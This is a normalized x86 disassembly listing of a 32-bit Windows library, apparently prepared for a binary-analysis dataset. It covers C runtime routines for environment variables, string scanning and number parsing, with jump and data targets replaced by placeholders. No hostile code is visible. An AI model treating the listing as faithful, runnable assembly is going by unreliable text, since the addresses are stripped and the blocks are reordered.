cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_100200e0
inc eax
pop ecx
inc eax
push eax
call sub_10026cea
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_100207fd
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_100200e0
inc eax
pop ecx
inc eax
push eax
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
push edi
call sub_100207fd
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_10026065
mov [ eax ] 0x2a
sub_10037b27
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_100200e0
mov esi eax
inc esi
push esi
call sub_10022f32
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
pop edi
pop esi
sub_10037b7c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_10037c60
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_10037c60
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10037d36
push 0x10
mov eax sub_10047a04
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1001b1bf
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10007ac8
mov eax [ esi + 0x8 ]
mov edi ebx
shl edi 0x2
add eax edi
cmp [ eax ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ edi + eax ] ecx
lea ecx [ ebp - 0x10 ]
call sub_1001b1e7
call sub_10023f0b
retn
mov ecx [ eax ]
call sub_10007b06
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_10026d36
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_1000228a
push r--data
lea eax [ ebp - 0x1c ]
push eax
call sub_10023a01
or [ rw-data ] 0x1
mov ecx esi
call sub_1002016b
push sub_1004b5b6
call sub_10024d30
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_10037e14
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10037e37
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003a55b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10037e5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_10037ec1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1000ee23
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10037ee7
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1000d6c2
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10037f0b
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1000d6ef
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10037f31
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10037f0b
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10037f0b
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10037f70
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_10037ec1
dec [ ebp + 0x1c ]
jne r-xdata
sub_10037f9b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10037ec1
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10037fd1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10037f9b
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10037f70
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_100208d0
add esp 0xc
test eax eax
je r-xdata
sub_10038094
push 0x38
mov eax sub_10047d07
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x44 ] eax
mov al [ edi ]
test al al
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
mov cl al
mov edx edi
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x40 ]
call sub_10023f1f
retn
mov al [ esi + edi ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov cl [ edi ]
cmp cl al
jne r-xdata
add esi [ ebp - 0x38 ]
mov al [ esi + edi ]
cmp al [ edi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
movsx eax [ eax ]
add esi eax
jmp r-xdata
inc esi
mov al [ esi + edi ]
test al al
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test al al
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp al cl
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10037f31
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10038064
cmp [ esi + edi ] al
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_10037f31
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_10037ee7
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor esi esi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] esi
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_10038201
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10037e14
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_100382a0
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10037e37
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003833f
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10038201
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_100383dc
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100382a0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10038479
push 0x20
mov eax sub_10047a72
call sub_10023e33
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1000d625
pop ecx
push eax
push 0x18
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1003833f
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000d565
mov ebx eax
jmp r-xdata
push [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_10046a40
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_1004383e
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_10043ccf
mov eax [ ebp + 0xc ]
or [ esi + 0x10 ] eax
add esp 0x30
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100381e4
push eax
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x12
call sub_10003651
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax esi
call sub_10023f0b
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_100383dc
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10037e14
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push ebx
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_1000ec6b
pop ecx
push eax
push 0x8
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10037e37
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push ebx
jmp r-xdata
xor ebx ebx
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov ebx eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10012b04
pop ecx
push eax
push 0x18
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx esi
call sub_1001da20
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push ebx
jmp r-xdata
mov ecx esi
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push ebx
jmp r-xdata
xor ebx ebx
push edi
push edi
push [ ebp + 0x8 ]
call sub_10012c8b
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push ebx
jmp r-xdata
sub_100386a0
push 0x88
mov eax sub_10047aa3
call sub_10023e9c
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x88 ]
call sub_1001b1bf
mov eax [ esi + 0xc ]
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test eax eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_1001e880
and [ ebp - 0x4 ] 0x0
push 0x0
push esi
lea eax [ ebp - 0x84 ]
push 0x3f
push eax
call sub_10038479
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x84 ]
call sub_10007701
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x88 ]
call sub_1001b1e7
shl eax 0x2
push eax
call sub_10026ca5
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_10023f1f
retn
mov edi [ esi + 0xc ]
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
test edi edi
ja r-xdata
push esi
lea ecx [ ebp - 0x94 ]
call sub_1000228a
push r--data
lea eax [ ebp - 0x94 ]
push eax
call sub_10023a01
or [ rw-data ] edi
mov ecx esi
call sub_1002016b
push sub_1004b5a2
call sub_10024d30
pop ecx
mov eax [ ebx + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10007ac8
sub_1003879b
push 0x50
mov eax sub_10047aeb
call sub_10023e9c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007b59
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10012b04
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007b41
lea ecx [ ebp - 0x2c ]
call sub_10007ee2
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1003c0be
mov [ ebp - 0x4 ] 0x3
call sub_1003c182
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10023f1f
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100021b2
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_100023ce
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_10037f70
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_10037f9b
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_10037f70
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_100388e4
push 0x58
mov eax sub_10047b20
call sub_10023e9c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x60 ] ebx
call sub_10012b04
mov esi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10005db0
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
push 0x8
pop ebx
and eax 0xe00
push 0xa
pop esi
cmp eax 0x400
jne r-xdata
mov ecx edi
call sub_10038064
mov ecx edi
cmp al 0x2b
jne r-xdata
push [ ebp - 0x5c ]
mov ecx edi
mov [ ebp - 0x50 ] ebx
call sub_10037f31
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_10038064
cmp al 0x2d
jne r-xdata
mov [ ebx ] al
jmp r-xdata
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebx ] al
mov ecx edi
inc ebx
mov [ ebp - 0x50 ] ebx
call sub_10037ee7
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_10038064
cmp al 0x30
jne r-xdata
mov [ ebp - 0x64 ] esi
cmp [ ebp - 0x54 ] esi
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_10037ee7
push [ ebp - 0x5c ]
push edi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx edi
call sub_10038064
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x64 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_100208d0
add esp 0xc
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x54 ] ebx
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov ecx edi
call sub_10038064
cmp al 0x78
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005ad1
push [ ebp - 0x5c ]
mov esi [ ebp - 0x60 ]
push edi
